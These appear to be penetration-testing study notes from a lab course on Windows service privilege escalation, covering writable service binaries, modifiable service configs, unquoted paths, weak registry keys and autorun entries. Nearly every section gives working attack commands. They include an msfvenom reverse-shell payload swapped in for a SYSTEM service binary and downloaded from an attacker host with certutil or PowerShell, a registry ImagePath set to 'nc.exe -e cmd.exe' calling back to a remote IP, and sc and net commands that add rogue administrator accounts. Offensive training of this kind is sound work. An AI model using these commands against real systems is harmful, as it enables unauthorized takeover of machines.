## Weak Permissions — Core Idea
- Services install/run as **SYSTEM** → any service permission flaw = full control of the box.
- Always check weak permissions with tools AND manually.

---

## 1. Permissive File System ACLs (modifiable service binary)
**Why:** If unprivileged users can WRITE to a service's .exe (ACL flaw), swap it for a malicious binary — it runs as SYSTEM when the service starts.

**Find weak service binaries:**
```cmd
.\SharpUp.exe audit   :: GhostPack — look for "Modifiable Service Binaries"
```

**Verify with icacls** — look for `(F)` (full control) for `Everyone` / `BUILTIN\Users`:
```cmd
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
:: BUILTIN\Users:(I)(F)   Everyone:(I)(F)  ← vulnerable (I=inherited, F=full)
```

**Exploit — full flow (attacker box first, then target):**

*Step 1 — create payload (Kali/Linux).* Stageless reverse shell so it works when spawned directly by the service; x64 for 64-bit Windows:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.163 LPORT=443 -f exe -o SecurityService.exe
# 32-bit target: windows/shell_reverse_tcp
```
> Name it the SAME as the original binary (`SecurityService.exe`) so the service path still resolves.

*Step 2 — serve it (Kali).* HTTP or SMB:
```bash
python3 -m http.server 8080
# or SMB (lets you copy straight from the share on Windows):
sudo impacket-smbserver share . -smb2support
```

*Step 3 — download on target, keep the original filename:*
```cmd
certutil -urlcache -f http://10.10.15.163:8080/SecurityService.exe C:\Temp\SecurityService.exe
:: or
powershell -c "Invoke-WebRequest http://10.10.15.163:8080/SecurityService.exe -OutFile C:\Temp\SecurityService.exe"
```

*Step 4 — start a listener (Kali):*
```bash
nc -lvnp 443
```

*Step 5 — backup the original binary (needed for cleanup):*
```cmd
copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" C:\Temp\SecurityService.exe.bak
```

*Step 6 — overwrite the original with the payload:*
```cmd
cmd /c copy /Y C:\Temp\SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
:: or straight from the SMB share:
copy /Y \\10.10.14.5\share\SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

*Step 7 — trigger it (service must be startable by us):*
```cmd
sc start SecurityService
:: service may show an error / stop — fine, the payload already ran as SYSTEM
```

*Step 8 — catch the shell* on the listener (SYSTEM context), then restore:
```cmd
copy /Y C:\Temp\SecurityService.exe.bak "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
> Alternative to a reverse shell: use `sc config`/`reg` tricks instead, or the payload could just `net user hacker P@ssw0rd /add && net localgroup administrators hacker /add`.

## 2. Weak Service Permissions (modifiable service config)
**Why:** With full control over the SERVICE (not just the file), we can change its `binpath` to run any command as SYSTEM.

**Find it:** SharpUp `audit` → "Modifiable Services".

**Verify with AccessChk** — `SERVICE_ALL_ACCESS` for Authenticated Users = vulnerable:
```cmd
accesschk.exe /accepteula -quvcw WindscribeService
:: -q omit banner | -u suppress errors | -v verbose | -c service name | -w only write access
```

**Check you're not already admin:**
```cmd
net localgroup administrators
```

**Exploit:** point binpath at our command (add user to admins / reverse shell):
```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService
:: FAILED 1053 is FINE — cmd runs as SYSTEM, then service errors & stops
```

**Verify:**
```cmd
net localgroup administrators
```

**Cleanup (always restore):**
```cmd
sc config WindscribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindscribeService
sc query WindscribeService   :: confirm STATE : 4 Running
```
> Also check **UsoSvc** (Windows Update Orchestrator, runs SYSTEM) — pre-CVE-2019-1322 weak perms allowed service-account → SYSTEM.

## 3. Unquoted Service Path
**Why:** If a service `binpath` has SPACES but NO quotes, Windows tries each folder as an .exe in order:
```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
Windows attempts (`.exe` implied): `C:\Program.exe` → `C:\Program Files.exe` → `C:\Program Files (x86)\System.exe` → ... If we can plant an exe in one of those folders → hijack as SYSTEM.

**Check the path is unquoted:**
```cmd
sc qc SystemExplorerHelpService
:: BINARY_PATH_NAME : C:\Program Files (x86)\System Explorer\service\...  ← no quotes
```

**Hunt for unquoted paths** (auto-start, non-Windows, unquoted):
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Exploit caveat:** need WRITE access to the hijack folder (usually root/Program Files = admin) AND ability to restart the service → often relies on a reboot. Less commonly exploitable.

## 4. Permissive Registry ACLs (weak service keys)
**Why:** Services also store their ImagePath in the registry (`HKLM\SYSTEM\CurrentControlSet\services\<name>`). If we can WRITE that key → change ImagePath → runs as SYSTEM.

**Find weak service keys:**
```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
:: -k registry keys | -v verbose | -u suppress errors | -q banner | -s recurse | -w write access
:: look for RW ... KEY_ALL_ACCESS
```

**Exploit:** change ImagePath to our command, then restart the service:
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## 5. Modifiable Registry Autorun Binary (Run keys)
**Why:** Programs in `Run` registry keys execute at login. If we can write to the key OR overwrite the binary it points to → code runs as that user on next login.

**List startup programs (which user, which key):**
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
:: Location: HKLM\...\CurrentVersion\Run  = runs for ALL users (better target)
::            HKU\<sid>\...\CurrentVersion\Run = runs at that user's login
```

**Exploit:** overwrite the listed binary (or registry value) → wait for the victim/admin to log in.

**Autorun locations to check:** HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, HKLM\...\RunOnce, HKCU/HKU equivalents, Startup folders.

## Quick Reference — Tools
| Tool | Use |
|---|---|
| `SharpUp.exe audit` | weak service binaries + modifiable services (one shot) |
| `icacls <path>` | filesystem ACLs — `(F)` full = game over |
| `accesschk.exe /accepteula -quvcw <svc>` | service write perms |
| `accesschk.exe /accepteula <user> -kvuqsw hklm\...\services` | registry key write perms |
| `sc qc / config / stop / start` | query / change / control services |
| `wmic service get ...` | find unquoted paths |
